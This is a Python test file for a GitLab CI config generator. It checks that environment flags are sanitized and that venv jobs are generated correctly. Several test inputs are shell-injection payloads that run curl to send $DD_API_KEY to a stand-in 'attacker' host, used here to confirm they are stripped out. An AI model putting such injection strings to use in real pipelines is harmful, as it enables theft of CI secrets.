"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import pathlib
import sys
import types
from unittest import mock

import pytest

from tests.environment import TestEnvironment as Environment


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"
_ROOT = _SCRIPT_PATH.parents[1]


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_collect_all_suite_venv_info_consumes_neutral_environments(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setattr(
        gen_gitlab_config_mod,
        "load_riot_test_environments",
        lambda suites: {
            "contrib::requests": (
                Environment("same-dependencies", "contrib::requests", "requests", "3.11"),
                Environment("new-dependencies", "contrib::requests", "requests", "3.12"),
            )
        },
    )

    info = gen_gitlab_config_mod.collect_all_suite_venv_info({"contrib::requests": {"pattern": "^requests$"}})

    assert info["contrib::requests"].venv_count == 2
    assert info["contrib::requests"].python_versions == {"3.11", "3.12"}


def test_uv_jobs_use_base_venv_artifacts_without_riot_cache(gen_gitlab_config_mod):
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="requests",
            suite="contrib::requests",
            stage="contrib",
            runner="uv",
            snapshot=True,
            services=["httpbin"],
            python_versions={"3.12"},
        )
    )

    assert "extends: .test_base_uv_snapshot" in config
    assert "TEST_SUITE: contrib::requests" in config
    assert 'UV_NO_CACHE: "1"' in config
    assert "uv run --no-project --python 3.9" in config
    assert "--with-requirements tests/locks/wait/wait-py39.txt" in config
    assert "    - job: build_base_venvs" in config
    assert "      artifacts: true" in config
    assert '          - PYTHON_VERSION: "3.12"' in config
    assert "PIP_CACHE_KEY" not in config
    assert "cache:" not in config


def test_base_venv_artifacts_cover_incremental_native_build_state():
    template = (_ROOT / ".gitlab" / "templates" / "build-base-venvs.yml").read_text()

    assert "      - ddtrace/**/*.so*" in template
    assert "      - src/native/target*/include/" in template
    assert "      - .download_cache/_cmake_deps/absl_install_*/" in template


def test_uv_template_refreshes_native_artifact_timestamps():
    tests_config = (_ROOT / ".gitlab" / "tests.yml").read_text()
    uv_template = tests_config.split(".test_base_uv:", 1)[1].split(".test_base_uv_snapshot:", 1)[0]

    assert "find ddtrace -type f -name '*.so*' -exec touch {} +" in uv_template
